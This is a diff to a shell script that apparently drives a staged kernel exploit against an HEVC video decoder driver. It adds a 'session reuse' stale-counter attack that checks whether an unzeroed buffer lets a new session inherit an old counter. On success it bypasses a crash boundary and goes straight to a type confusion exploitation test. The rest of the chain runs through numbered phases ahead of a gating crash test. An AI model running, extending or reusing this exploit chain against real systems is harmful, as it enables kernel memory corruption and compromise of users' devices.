@@ -66,10 +66,34 @@ if ! run_test "01_mvhevc_verify" "quick"; then
     exit 1
 fi
 
-# PHASE 2: Cumsum Prediction (measure NAL sizes)
+# PHASE 2: Session Reuse (stale counter — can bypass crash boundary)
 echo ""
-echo ">>> PHASE 2: Cumsum Prediction <<<"
-run_test "02_cumsum_predict" "cumsum_predict" || true
+echo ">>> PHASE 2: Session Reuse Test (stale counter attack) <<<"
+echo "If kalloc_data doesn't zero the HEVC buffer, a new session inherits"
+echo "the old VPS counter. Allocation flag analysis shows Z_WAITOK only (no Z_ZERO)."
+echo ""
+if run_test "02_session_reuse" "session_reuse" "0x4141" "5"; then
+    if grep -q "STALE COUNTER DETECTED" "$LOG_DIR/02_session_reuse.txt" 2>/dev/null; then
+        echo ""
+        echo "======================================================="
+        echo "  STALE COUNTER CONFIRMED! Crash boundary BYPASSED!"
+        echo "  Proceeding directly to type confusion exploitation."
+        echo "======================================================="
+
+        run_test "02b_type_confusion_via_reuse" "type_confusion" "215" || true
+
+        echo ""
+        echo "Session reuse path complete. Check crash logs."
+        echo "Results: $LOG_DIR/"
+        exit 0
+    fi
+fi
+echo "Session reuse: memory zeroed (proceeding to crash_test)"
+
+# PHASE 2b: Cumsum Prediction (measure NAL sizes)
+echo ""
+echo ">>> PHASE 2b: Cumsum Prediction <<<"
+run_test "02b_cumsum_predict" "cumsum_predict" || true
 
 # PHASE 3: THE GATING TEST — crash_test at encode 198
 echo ""
